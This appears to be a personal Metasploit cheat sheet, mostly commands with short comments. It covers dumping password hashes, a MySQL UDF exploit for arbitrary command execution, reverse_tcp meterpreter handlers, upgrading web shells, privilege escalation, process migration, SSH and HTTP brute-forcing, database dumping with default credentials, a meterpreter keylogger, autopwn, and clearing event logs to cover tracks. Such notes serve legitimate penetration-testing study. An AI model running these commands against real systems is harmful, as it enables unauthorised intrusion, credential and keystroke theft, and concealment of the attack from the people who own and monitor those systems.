![[Pasted image 20221124173058.png]]


```bash

sudo service postgresql start && sudo msfdb init && msfconsole -q

db_status

```

# Wordlists

```bash
/usr/share/metasploit-framework/data/wordlists/

# common
common_users.txt
unix_passwords.txt 


```

# Post exploit

```ruby
post/linux/gather/enum_users_history # find users history file
```

# Dump hashes

```ruby

run post/windows/gather/hashdump  # meterpreter 

use /post/linux/gather/hasdump #msf

```



# Databases
```ruby
use exploit/multi/mysql/mysql_udf_payload # It's a MySQL UDF exploit which will create a User-Defined Function (UDF) and allow us to run arbitrary commands using it.

# Dump the schema 

use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres 
# run postgres://USERNAME:PASSWORD@IP/DATABASE_NAME

# Select information from a specific table
use auxiliary/admin/postgres/postgres_sql 
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'

```


# Meterpreter listener 
```ruby

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp


```


# upgrade webshell to metepreter shell

```
exploit/multi/script/web_delivery
```



# Priv esc

```ruby

getsystem # quick privesc 

getprivs # check usuer pirvs


post/multi/recon/local_exploit_suggester

```

# Migrate to processes windows

```
pgrep explorer # find explorer process id
ps

migrate NUMBER

```

# port scan 
```bash
# We can use nmap on metasploit by typing nmap and run the command normaly if we used the last command
# Or we can use Metasploit port scan module 

use auxiliary/scanner/portscan/tcp 
set PORTS 80, 8080, 445, 21, 22 # Setting ports to scan
set RHOSTS 192.69.228.3-10 # Setting ip range for port scan

use auxiliary/scanner/discovery/udp_sweep # UDP scan 
```


# general

```ruby
# Workspaces
workspace -h

workspace # check current workspace

hosts # check targets u interacted with 

workspace -a NAME # create workspace with the name NAME

workspace NAME # switch workspaces 

workspace -d NAME # delete workspace NAME

workspace -r NAME NOT_NAME # change workspace name

# sessions

sessions -i # list or attach
sessions -k # kill
sessions -u 1 # upgrade session 1 to meterpreter session
sessions -n NAME -i 1 # rename session 1 to NAME
# global variables 
setg
#removes value from option
unset 

# Check saved info gathered from sessions

loot 
creds
notes
# Meterpreter
keyscan_start # start keylogger on target 
keyscan_dump # dump recoreded keystrokes 
```


## nmap metasploit

```bash

# export nmap scan into xml format using -oX or -oA 
# Then import it to metasploit using db_import and the path 

db_import NMAP.xml 

services # Show nmap results 

# Running nmap inside metasploit

db_nmap # uses nmap inside msfconsole and adds results into database

vulns # shows if there is known vulnerabilities for the services nmap scanned 
vulns -p PORT
analyze # check target open ports for exploits 
```


# Web

```ruby
-   auxiliary/scanner/http/apache_userdir_enum # enum usernames on server 
-   auxiliary/scanner/http/brute_dirs
-   auxiliary/scanner/http/dir_scanner # directory bruteforce
-   auxiliary/scanner/http/dir_listing
-   auxiliary/scanner/http/http_put # upload files 
-   auxiliary/scanner/http/files_dir # files bruteforce
-   auxiliary/scanner/http/http_login # bruteforce 
-   auxiliary/scanner/http/http_header # get request headers 
-   auxiliary/scanner/http/http_version # server version
-   auxiliary/scanner/http/robots_txt # check for robots.txt
```

## wmap

```ruby
load wmap

wmap_sites -a  IP# adds sites

wmap_targets -t http://URL # adds url for scan

wmap_sites -l # list sites
wmap_targets -l # list targets

wmap_run -t # shows modules that will be ran 

wmap_run -e # starts scanning with modules 

wpmap_vulns -l # list vulns 
```
# ssh
```ruby

-   auxiliary/scanner/ssh/ssh_version # enum version
-   auxiliary/scanner/ssh/ssh_login # login bruteforce
-   auxiliary/scanner/ssh/ssh_login_pubkey # login with private key
-   auxiliary/scanner/ssh/ssh_enumusers # enum users 
```

# Autopwn

[autopwn](https://github.com/hahwul/metasploit-autopwn) 



```bash
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb

sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/

# Inside metasploit

load db_autopwn

# Usage

db_autopwn

db_autopwn -p -t  -PI PORT

```

# Clear tracks
```rb
clearev # inside meterpreter session 
```